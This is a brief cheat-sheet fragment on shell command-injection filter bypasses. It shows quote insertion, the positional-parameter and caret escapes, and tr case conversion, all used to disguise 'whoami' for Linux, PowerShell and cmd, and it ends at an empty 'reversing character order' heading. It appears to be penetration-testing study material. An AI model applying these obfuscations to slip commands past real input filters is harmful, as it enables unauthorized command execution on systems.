
### Using Obfuscation For Filter Bypass

Obfuscating letters since shell don't recognize (E.g single quotes) [powershell and linux]
```shell-session
w'h'o'am'i
```
(E.g double quotes) [powershell and linux]
```shell-session
w"h"o"am"i
```
using positional character [linux only] 
```bash
who$@ami
```
using positional character [windows cmd]
```cmd-session
who^ami
```


### StriManipulation For Filter Bypass

forcing characters to lowercase (ends up being "whoami" )
```shell-session
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

reversing character order